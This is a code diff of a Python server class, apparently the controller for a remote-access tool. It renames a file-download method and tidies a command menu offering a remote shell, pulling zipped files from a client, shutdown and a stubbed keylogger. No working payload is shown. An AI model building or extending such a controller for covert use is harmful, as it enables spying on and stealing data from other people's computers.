@@ -90,7 +90,7 @@ class Server:
         results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
         print(results)
 
-    def oncoDLF(self):
+    def downlfile(self):
 
         command = "sendZip"
         self.client_socket.send(command.encode("utf-8"))
@@ -171,28 +171,24 @@ class Server:
         print(f"[!] {self.address[0]} has been Shut Down")
 
     def commands(self):
-
         while True:
          # get the command from prompt
             command = input("Enter the command you want to execute:")
             # send the command to the client
             print(command)
             # self.client_socket.send(command.encode())
-
             if command == "exit":
                 # if the command is exit, just break out of the loop
                 break
-
             elif command == "msg":
                 # retrieve command results
                 print("here2")
                 input()
                 self.sendMsg()
-
             elif command == "shell":
                 self.cmdctrl()
             elif command == "sendZip":
-                self.oncoDLF()
+                self.downlfile()
             elif command == "shutdown":
                 self.shutdown()
             elif command == "disconn":
@@ -206,7 +202,6 @@ class Server:
                 '''do this'''
             elif command == "keylogger":         # TODO
                 '''do this'''
-
             else:
                 print("No Valid Command Received")
         sys.exit()
@@ -214,7 +209,6 @@ class Server:
         self.client_socket.close()
         # close server connection
         self.close()
-
         print(results)
 
     def disconn(self):
